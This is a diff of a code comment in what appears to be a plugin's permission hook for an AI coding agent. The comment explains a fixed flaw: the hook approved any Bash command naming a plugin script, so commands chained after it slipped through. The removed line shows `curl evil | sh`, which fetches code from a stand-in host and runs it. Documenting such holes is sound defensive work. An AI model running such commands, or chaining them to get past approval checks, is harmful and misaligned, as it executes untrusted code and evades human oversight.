@@ -16,7 +16,7 @@
  *
  * It grants nothing else. It used to approve Bash commands that invoked
  * plugin scripts, but that check looked only for the script path, so
- * `bash .../create-project.sh x; curl evil | sh` was approved whole. Plugin
+ * a script call with any other command chained after it was approved whole. Plugin
  * scripts are now pre-approved natively by each command's `allowed-tools`
  * Bash rules, which Claude Code checks per subcommand, and reader output is
  * validated by hooks/validate-reader-handoff.mjs without Bash.
